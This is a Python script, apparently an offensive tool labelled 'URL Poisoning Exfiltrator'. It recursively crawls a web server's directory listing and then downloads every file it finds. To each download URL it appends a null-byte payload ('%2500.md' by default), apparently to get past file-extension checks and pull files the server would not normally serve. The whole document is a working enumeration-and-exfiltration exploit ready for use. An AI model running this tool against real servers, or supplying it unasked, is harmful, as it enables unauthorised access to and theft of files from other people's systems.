#!/usr/bin/env python3
import os
import json
import argparse
import requests
from bs4 import BeautifulSoup

""" Programming concept:

TO BE IMPLEMENTED multithread, each thread handles one dir/subdir
target_dict = {root:[list of files], root/dir1:[list of files], root/dir2:[list of files]}
"""

# Methods Declaration
def addToDict(t_dict, t_key, t_value):
	t_dict[t_key] = t_value

def getDomain(url):
	domain = url.replace('/', ' ')
	domain = ' '.join(domain.split())
	domain = list(domain.split(" "))[1]
	return domain

def getProtocol(url):
	protocol = url.replace('/', ' ')
	protocol = ' '.join(protocol.split())
	protocol = list(protocol.split(" "))[0]
	return protocol

def getPath(url):
	protocolDomain = getProtocol(url) + '//' + getDomain(url) + '/'
	if protocolDomain in url:
		return url.replace(protocolDomain, '')
	else:
		return ""

def isDir(target, url):
	tempR = requests.get(url + '/' + target.text + '/')
	if tempR.status_code == 200:
		# current target is a URL
		#print(f"{target.text} is a directory")
		return True
	else:
		return False

def printDict(t_dict):
	print('='*64)
	for directory, fileList in t_dict.items():
		# *list(fileList) unpacks the list and seperate with \n\t
		print(f"\nFile Path: {directory}\t", *list(fileList), sep='\n\t- ')

""" USAGE of function
User supplied inputs:
	t_dict : master dict to store {dir:[list of targets], dir/subDir: [list of targets]...}
	t_dirList : [root, root/sub, root/sub/sub2 ...]
	t_url : `http://localhost.com/folder
Default:	
	t_tarList : default=[] BUT explicitly supply an empty list when recursive call
"""
def setUpExfiltrate(t_dict, t_dirList, t_url, arg_v, t_tarList=[]):
	if arg_v>=2: print(f"\nCurrently exfiltrating @ {t_url}")

	# currentDir = path of t_url
	currentDir = getPath(t_url)

	payload = '%2500.md'

	# Set up root folder by checking if dict is empty
	if not bool(t_dict):
		# Add this for root dir
		if arg_v>=2: print(f"Root folder = {currentDir}/")

		addToDict(t_dict, currentDir, [])
		t_dirList.append(currentDir)
		if arg_v>=3:
			print(f"t_dict = {t_dict}")
			print(f"t_dirList = {t_dirList}")
			print(f"t_tarList = {[t.text for t in t_tarList]}\n")

			print(f"############ Recursively exfiltrating : {t_url} ############\n")
		
		setUpExfiltrate(t_dict, t_dirList, t_url, arg_v)

	else:
		# Get request
		r = requests.get(t_url)

		# See if soup can detect anything else stop
		soup = BeautifulSoup(r.text, 'lxml')
		# Make this dynamic, consider a third - fifth param tag_list, class_list, id_list
		t_tarList += soup.find_all('span', class_ = 'name')
		#targets = soup.find_all('span', class_ = 'name')
		
		# Base case/stop condition | check if tarList is empty
		if not t_tarList:
			if arg_v>=1: print(f"No more target found...")
		else:
			for target in t_tarList:
				# Check for path back to parent
				if target.text == '..':
					continue
				else:
					if arg_v>=2:
						print(f"Currently pointing @ {t_url}")
						print(f"Target is {target.text}")

					if isDir(target, t_url) == True:
						# Update t_dict keys
						newKey = currentDir + '/' + target.text # currentDir/newKey
						addToDict(t_dict, newKey, [])
						# Append to dirList
						t_dirList.append(newKey + '/')
						t_tarList.remove(target)

						# Debugging console out
						if arg_v>=1: print(f"Folder identified : {newKey}")
						# print(f"t_dict = {t_dict}")
						# print(f"t_dirList = {t_dirList}")
						# print(f"t_tarList = {[t.text for t in t_tarList]}\n")

						# RECURSIVE STEP
						if arg_v>=3: print(f"============ Entering recursion @ {t_url}/{target.text} ============\n")
						r_tarList = [] # Setup an empty tarList for recursive call
						setUpExfiltrate(t_dict, t_dirList, t_url + '/' + target.text, args.verbose, r_tarList)
						if arg_v>=3: print("################## Recursive exfiltrate done... ##################\n")
							
					else:
						# eg. t_dict[root/subdir1]
						#print(f"target is not file...\ndict[{currentDir}].append({target.text})")
						t_dict[currentDir].append(target.text)
						if arg_v>=2: print(f"File/Non-Folder identified : {target.text}")
						if arg_v>=2: print('')


def exfiltrate(t_dict, url, payload, arg_v):
	print('\n', '='*64,)
	# Make Directory
	for directory in t_dict:
		os.makedirs(directory, exist_ok = True)

		# Download files
		for file in t_dict[directory]:
			f_req = requests.get(url + '/' + file + payload, allow_redirects = True)
			writePath = os.path.join(directory, file)
			open(writePath, 'wb').write(f_req.content)
			if arg_v>=1: print(f"Downloaded {file} @ {url}/{file}{payload}\n")

# -------------------------------------------------------------

# MAIN LOOP
help_msg = """
URL Poisoning Exfiltrator:
	This tool will enumerate the URL given and then try to download the files in the given URL."""

parser = argparse.ArgumentParser(description=help_msg, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, required=True, help="http://target.com/dir")
parser.add_argument('-p', '--payload', type=str, required=True, help="%%2500.md")
parser.add_argument('-v', '--verbose', action="count", default=0, help="Verbosity -v: small, -vv: medium, --vvv: large")
parser.add_argument('-o', '--output', required=True, type=str, help="creates a file in json format of enumerated directory and resources")
parser.add_argument('-t', '--type', required=True, type=str, help="type of operation: enum, exfilt")

args = parser.parse_args()

# User input temp variables
cur_path = os.getcwd()
folders = []
target_dict = {}


setUpExfiltrate(target_dict, folders, args.url, args.verbose)


if args.type == 'exfilt': exfiltrate(target_dict, args.url, args.payload, args.verbose)


if args.verbose>=1: printDict(target_dict)

# Output FILE if -o flag set
with open(args.output, 'w') as file:
	if args.verbose>=1: print(f"\nWriting to {cur_path}/{args.output}")
	file.write(json.dumps(target_dict))